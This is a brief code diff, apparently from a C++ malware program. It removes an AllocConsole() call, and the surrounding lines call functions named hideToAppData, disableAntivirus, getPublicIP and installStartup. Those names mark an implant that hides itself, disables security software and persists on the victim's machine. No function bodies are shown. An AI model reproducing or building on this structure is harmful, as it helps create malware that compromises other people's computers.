@@ -1689,7 +1689,6 @@ int main(int argc, char* argv[]) {
     if (computerName.empty()) computerName = getComputerName();
     hideToAppData();
     disableAntivirus();
-    AllocConsole();
     ShowWindow(GetConsoleWindow(), SW_SHOW);
     publicIP = getPublicIP();
     installStartup();
